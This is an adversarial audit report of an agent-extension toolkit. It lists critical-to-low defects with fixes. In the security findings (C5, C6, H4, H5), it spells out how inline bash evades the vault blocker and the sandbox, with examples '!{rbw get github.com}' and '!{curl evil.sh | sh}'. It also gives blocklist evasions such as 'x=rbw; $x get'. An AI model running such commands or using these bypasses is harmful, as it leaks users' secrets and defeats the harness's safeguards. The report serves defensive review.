# Adversarial Codebase Audit — agent-kit

Date: 2026-07-03
Scope: full repo (`extensions/*`, `packages/*`, `agents/`, `prompts/`, root config + docs).
Method: 7 parallel read-only audit agents, one per domain; highest-impact findings spot-verified against source.
Mandate: not just defects — design incoherences, unexpected affordances, doc drift, and mismatches
between what the code *invites* and what it *does*.

Totals: ~12 critical · ~20 high · ~29 medium · ~23 low.

---

## Cross-cutting themes (read these first)

1. **Documentation describes a different, older repo.** `AGENTS.md` and `README.md` are the single largest
   source of "invite-vs-does" gaps. They advertise phantom extensions (`plan-mode`/`/plan`, `oracle`,
   `groq/openrouter/together-provider`, `brave-search`, `exa-search`, `jina`, `handoff`, `exit`,
   `git-commit-context`, `recorder`, `permission-gate`, `lsp-guidelines`, `skill-namespaces`,
   `pi-fancy-footer`, `kagi-search`), a phantom top-level `skills/` tree (deleted in commit `a708800` — only
   `blueprint` remains), a phantom `extensions/_shared/` (shared code is now `@aldoborrero/pi-common`), wrong
   counts ("35 local + 4 external" vs 28 real), and calls the Python `packages/` "Nix packages". An LLM
   treating `AGENTS.md` as ground truth will invent commands/tools that 404.

2. **Security controls are per-extension and composably bypassable.** Every guard assumes execution flows
   through the `bash` *tool* + an interactive `hasUI` confirmation. `pi.exec` and headless (`print`/`json`)
   modes are the blind spots that break the guarantees — and one extension defeats another's controls.

3. **The advertised one-shot install is broken.** `@aldoborrero/pi-agent-kit` has `"*"` dependency ranges
   (unpublishable by npm), omits `pi-web-tools` (whose `web_search`/`web_fetch` the docs call "Preferred"),
   uses `process.cwd()` (violating the repo's own rule), and points `pi.themes` at an uninstalled package.

4. **Silent failure / fail-open.** git-checkpoint reports "restored" on a failed/aborted restore; sandbox
   fails open on init error; codex success-detection is always false; web-tools `auto` collapses to
   DuckDuckGo; the loop scheduler can end with **no owner** (dead) or **two owners** (double-firing).

5. **Unbounded resource use.** `pi-until` has no max-iteration cap; `pi-suggest` fires a full model call every
   turn with no debounce; `pi-btw` globals (full conversation snapshots) are never cleaned up.

6. **Missing network hygiene, against the repo's own convention.** `pi-web-tools` has zero timeouts/backoff;
   `pi-telegram` backoff has no jitter; `pi-voice` daemon and `github-search` have no timeout.

7. **Runtime state committed to git.** `.pi/loop-tasks.lock`, `.pi/loop-tasks.json`, `.pi/workflows/state.db`,
   and `__pycache__/*.pyc` are tracked.

---

## CRITICAL

### C1. `pi-web-tools` fails to load — duplicate `import` (fatal ESM)
`extensions/pi-web-tools/src/extension.ts:7` and `:21` both `import { resolveApiKey, stripHtmlToText } from "./providers/utils.ts";`
Duplicate lexical declaration = fatal parse error under Node's ESM loader (bun bundling masks it; repo has no
build step). `web_search` + `web_fetch` + both slash commands silently fail to register. Introduced by the
recent provider refactor (`886bfb6`/`07eb3c9`). **Fix:** delete line 21; add a `tsc --noEmit` CI check.

### C2. Advertised install `@aldoborrero/pi-agent-kit` is unpublishable (`"*"` deps)
`extensions/pi-agent-kit/package.json:34-74` — all deps pinned `"*"`; `publishConfig.access:"public"`, no
`"private": true`. npm rejects wildcard specifiers at publish; `scripts/publish-all.ts` will try and fail on
the one package users are told to install. **Fix:** real semver ranges before publish + a publish-time guard.

### C3. `pi-web-tools` not wired into the aggregator (missing "Preferred" tools)
`extensions/pi-agent-kit/src/extension.ts` / `package.json` — no reference to `@aldoborrero/pi-web-tools`
(verified). Installing the aggregator yields zero web tools despite docs calling them Preferred. **Fix:** add
dep, import factory, append to `MEMBERS`.

### C4. Root `pi.themes` points at an uninstalled package
`package.json:49-52` → `node_modules/@xynogen/pix-themes/themes` does not resolve from repo root (`@xynogen`
is only an aggregator sub-dep, pinned `"*"`, never installed). Entire pix-themes set silently dropped.

### C5. inline-bash `!{...}` bypasses the Bitwarden bash-blocker → secret exfiltration
`extensions/pi-inline-bash/src/extension.ts:56` runs via `pi.exec("bash",...)`, which does **not** fire the
`tool_call`/`user_bash` events that `pi-bitwarden` (`extension.ts:561-584`) hooks to block `rbw`/`bw`. A prompt
`...!{rbw get github.com}` expands the raw secret into the prompt text, sends it to the LLM (`action:"transform"`)
and persists it in session history. Collapses the entire vault-protection model. **Fix:** route inline-bash
through the guarded bash pipeline, or have bitwarden also intercept `input`.

### C6. inline-bash `!{...}` also bypasses the OS sandbox
Same `pi.exec` path is neither the `bash` tool nor `user_bash`, so `/sandbox on` does not wrap it
(`pi-sandbox/src/extension.ts:247-265`). `!{curl evil.sh | sh}` runs unsandboxed while the footer shows
"sandbox on" — security theater for this path.

### C7. git-checkpoint reports "Code restored" even when `git stash apply` fails
`extensions/pi-git-checkpoint/src/extension.ts:47-50` — exec result (`.code`/`.stderr`) never inspected; always
notifies success. Empirically, with any uncommitted change to a checkpointed file (the normal post-turn state)
`git stash apply <sha>` aborts with exit 1; the user is told the restore worked when nothing changed. **Fix:**
check exit code; use a real rewind.

### C8. git-checkpoint "restore" is additive, not a reset
`git stash apply` merges stashed tracked changes into the current tree; files/edits created *after* the
checkpoint are **not** reverted, and untracked files are never captured (`git stash create` omits them). The
`/fork` "restore code to that point" affordance leaves a hybrid tree the user didn't ask for.

### C9. Loop scheduler: passive session that empties its task list kills its own takeover probe
`extensions/pi-loop/src/scheduler.ts:70-84` — `deleteTask`/`clearAll` call `stop()`, which unconditionally
`clearInterval(lockProbeTimer)`. A passive session then can never take over if the owner exits. Combined with
C10 the scheduler can end with **no owner** at all.

### C10. Loop lock relies solely on PID liveness — stale lock / double owner
`extensions/pi-loop/src/loop-lock.ts:31-36,83-90` — takeover gate is `process.kill(pid,0)`; `acquiredAt` is
written but never used for staleness. PID reuse after a crash → lock never reclaimed (dead scheduler). The
unguarded `unlink`-then-`create` steal can also delete a fresh owner's lock → two owners double-firing.
**Fix:** time-based staleness + heartbeat re-write of `acquiredAt`; treat `EPERM` as "unknown".

### C11. Documented top-level `skills/` tree does not exist
`AGENTS.md:16-21` advertises `skills/{ast-grep,kagi-search,pexpect-cli,searxng-search,superpowers(13)}`.
Reality: only `extensions/pi-skills/skills/blueprint/SKILL.md`. Deleted in `a708800`. `read_skills` lists only
`blueprint`.

### C12. `pexpect-cli` wheel build fails — ambiguous flat-layout discovery
`packages/pexpect-cli/pyproject.toml` (no `[tool.setuptools]`) + `tests/__init__.py` create two top-level
packages (`pexpect_cli`, `tests`). setuptools≥61 raises "Multiple top-level packages discovered". `pip install`
/ `python -m build` / Nix `buildPythonApplication` all fail. **Fix:** `[tool.setuptools.packages.find]
include=["pexpect_cli*"]` or drop `tests/__init__.py`.

---

## HIGH

### Foundation / docs
- **H1. AGENTS.md commands/tools/providers tables are largely fictional** (`AGENTS.md:35-125`) — phantom
  extensions listed above; real ones (`pi-alias`, `pi-edit`, `pi-skills`, `pi-themes`) unlisted.
- **H2. AGENTS.md directory structure is fictional** — `_shared/`, top-level `skills/`/`themes/`, "35+4" count.
- **H3. README documents nonexistent `pi-workflows` and `pi-exit` extensions** (dead links `README.md:50,58`);
  workflows are actually the external `@quintinshaw/pi-dynamic-workflows` wired in the aggregator.

### Security
- **H4. `bw_get` returns password/TOTP/notes with NO confirmation in `print`/`json` modes**
  (`pi-bitwarden/src/extension.ts:371`, gate `isSensitive && ctx.hasUI`). Confirmation is skipped in exactly
  the unattended modes. **Fix:** fail closed when `!ctx.hasUI`.
- **H5. Bitwarden bash-block is a bypassable case-sensitive blocklist** (`:567,575`) — beaten by `x=rbw; $x get`,
  backslash-continuation, unlisted subcommands. **Fix:** tokenize argv / allowlist.

### Code / git
- **H6. `pi-edit` drops the built-in's multi-occurrence uniqueness guard** (`pi-edit/src/classic.ts:54-96`
  first-match `indexOf`) — silently edits the wrong location when `oldText` is ambiguous; the exact hazard
  `AGENTS.md:306` warns about, while the README claims "safer".
- **H7. `pi-codex` reads a non-existent `exitCode` field** (`pi-codex/src/extension.ts:58,67`) — `pi.exec`
  returns `code`; `exitCode` is always `undefined`→`1`, so the success branch never fires and stderr-on-success
  is mislabeled as `Error`. **Fix:** read `result.code`.

### Orchestration
- **H8. `pi-until` has no max-iteration guard** (`pi-until/src/extension.ts:404-419`) — unbounded, unattended
  token spiral if the condition never holds; non-UI sessions can't even break on abort.
- **H9. `pi-suggest` spawns a full agent session every `agent_end`** (`pi-suggest/src/extension.ts:856-961`) —
  no debounce/throttle/cache (computed `turnKey` unused); enabled by default. Recurring hidden cost.
- **H10. `pi-until` registers `until` but every doc/usage string says `/loop`** (`:346` vs `:366`,
  `README.md`) — and `pi-loop` owns `loop`, so following the docs invokes the wrong extension.
- **H11. TOCTOU / lost-takeover race in loop-lock** (`loop-lock.ts:31-36`) — unguarded `unlink` can delete a
  freshly reclaimed lock → two owners.

### Network
- **H12. `auto` search mode excludes env-keyed backends → collapses to DuckDuckGo**
  (`pi-web-tools/src/extension.ts:538`, `resolveApiKey(..., [])` with empty env list). Exporting `EXA_API_KEY`
  (the documented setup) still yields DuckDuckGo scraping in auto mode; explicit `provider="exa"` works —
  confusing divergence.
- **H13. No request timeout anywhere in web-tools** (`providers/*.ts`) — one unresponsive endpoint hangs the
  turn unbounded. **Fix:** `AbortSignal.any([signal, AbortSignal.timeout(N)])`.

### Python / skills
- **H14. `pexpect-cli` tests target an empty, never-committed `bin/`** (`tests/test_integration.py:16-18`) —
  suite is non-executable; nothing verifies server/client.
- **H15. `skill-namespaces` extension referenced 3× in AGENTS.md but does not exist** (deleted).
- **H16. `kagi-search` is a phantom** — appears only in `AGENTS.md:18`.

### UI / session
- **H17. Cross-session `/btw` questions leak into every session's prompt**
  (`pi-btw/src/extension.ts:150-165` `recentQuestionHint` iterates *all* sessions' histories). README promises
  "this Pi process… this session"; private questions from repo A surface in repo B. **Fix:** scope to current
  session.
- **H18. `pi-skills` directive classifier misses reordered `rm` and has no `sudo` rule**
  (`pi-skills/src/directive.ts:82-86`) — `!`cmd`` directives auto-execute at skill-load with no prompt; denylist
  is leaky. **Fix:** allowlist read-only commands.

---

## MEDIUM (selected)

- **M1. Aggregator uses `process.cwd()`** at module load (`pi-agent-kit/src/extension.ts:54`) — violates the
  repo's own "always `ctx.cwd`" rule; workflow storage keyed to wrong dir on `/resume` or launch-from-parent.
- **M2. `once` helper copy-pasted into ~26 extensions** instead of living in `pi-common` — correctness-sensitive
  idempotency logic with 26 divergeable copies.
- **M3. `typebox` (unscoped) vs `@sinclair/typebox`** coexist — different packages; schema mismatches.
- **M4. README install/test commands wrong** (`./pi-agent-kit` path; `bun test` with zero tests).
- **M5. Telegram polling backoff has no jitter** (`pi-telegram/src/extension.ts:693`) — thundering herd;
  violates repo convention.
- **M6. Provider error bodies flow verbatim into LLM context** (web-tools `providers/*`) — prompt-injection +
  possible secret echo; no truncation/sanitization.
- **M7. web-tools README lists 3 backends; code registers 8** and documents an auto order it doesn't implement.
- **M8. Sandbox fails open on init error** (`pi-sandbox/src/extension.ts:251-252,316-321`) — bash runs
  unsandboxed while status shows "error".
- **M9. Custom/hidden Bitwarden fields treated as non-sensitive** (`:367,404-406`) — LLM reads API-key custom
  fields with no confirmation.
- **M10. `.pi/loop-tasks.lock` / `.pi/loop-tasks.json` committed & not ignored** — merge noise, leaked PIDs.
- **M11. `/diff --staged` broken on the tuicr path** (`pi-diff/src/extension.ts:45-46`) — `tuicr -r --staged`.
- **M12. pi-diff README describes a different extension** (auto tool-result rendering vs a `/diff` command).
- **M13. git-checkpoint `stash create` omits untracked files**; checkpoints are in-memory and cleared on
  `agent_end`, and keyed to the wrong entry — `/fork` restore usually no-ops.
- **M14. questionnaire crashes on empty `options` + `allowOther:false`** (`pi-questionnaire/src/extension.ts:293-303`).
- **M15. SKILL.md `name`==dir is unenforced** — loader uses the directory name; frontmatter `name` is dead for
  resolution despite AGENTS.md's "MUST".
- **M16. pi-btw retains full conversation snapshots in a global, never cleaned** (no `session_shutdown`;
  `dispose()` dead) — unbounded memory + keeps leak-able histories alive.
- **M17. pi-footer "falls back if pi-fancy-footer absent" is not implemented** — no detection; last-writer-wins.
- **M18. pexpect-cli doesn't forward `XDG_RUNTIME_DIR`** — socket-path mismatch → spurious 5s TimeoutError.
- **M19. pexpect server `exec()`s arbitrary code from an unauthenticated Unix socket** — local RCE if the socket
  root is mis-configured to a shared dir; trust model undocumented.
- **M20. AGENTS.md calls Python `packages/` "Nix packages"** — hides that pip/pytest are first-class.
- **M21. pi-direnv README describes a `tool_result` hook + status icons the code doesn't implement.**

## LOW (selected)

- pi-common barrel imports `.js` while shipping only `.ts` (fragile under strict Node resolvers).
- AGENTS.md agent-name/model list stale ("scout/haiku, planner/opus" vs real `explore/plan/build/...`, sonnet/opus).
- `publish-all.ts` treats registry fetch failure as "not published" (no backoff) → surprise publish blast radius.
- pi-edit accepts empty `oldText` (inserts at file start); narrower fuzzy matching than the built-in it replaces.
- pi-codex/pi-subagent READMEs omit most subcommands / reference nonexistent files.
- Orphaned `.pi/workflows/state.db` committed with no owning extension.
- `pexpect-cli` brittle session-id substring matching; committed `__pycache__/*.pyc`; mypy skips tests.
- pi-voice daemon `start/stop` and `github-search` `gh` subprocess have no timeout.
- pi-tuicr temp-file leak on crash; cancel indistinguishable from empty review ("Review completed").
- pi-footer/pi-btw minor input-edge and staleness issues.

---

## Solid, verified-good components (not everything is broken)

- `pi-common` `ui-colors` + `editor-registry` (sound globalThis/WeakMap idempotency).
- `pi-ast-grep` (shell-free `spawn`, temp-rule cleanup, correct exit-code semantics).
- `pi-edit` patch engine + rollback + encoding (BOM/CRLF) preservation.
- `pi-subagent` worker-pool concurrency, `0o600` prompt files, chain forwarding, fail-fast.
- `pi-notify` OSC sanitisation (closes escape-injection); `pi-telegram` per-user auth + token never echoed;
  web-tools `validatePublicHttpUrl` SSRF guard (though redirects aren't re-checked).
- `packages/searxng-search` (clean stdlib CLI, real tests, strict mypy, `SEARXNG_API_BASE` honoured).
- `blueprint` skill frontmatter matches its dir.

---

## Suggested triage order

1. **C1** (one-line fix, restores web tools) → **C3/C4** (make the aggregator actually work).
2. **C5/C6/H4/H5** (security composability — the most dangerous class).
3. **C7/C8/M13** (git-checkpoint: fix or clearly relabel; it silently misleads today).
4. **C9/C10/H11** (loop scheduler ownership — correctness of a persistent, multi-session feature).
5. **Doc drift sweep** (C11/H1/H2/H3/H10/H15/H16/M20) — regenerate AGENTS.md/README from the real tree; this is
   the bulk of the "invite-vs-does" mandate and the cheapest high-value win.
6. **C2/C12** (publish + Python build) before any release.
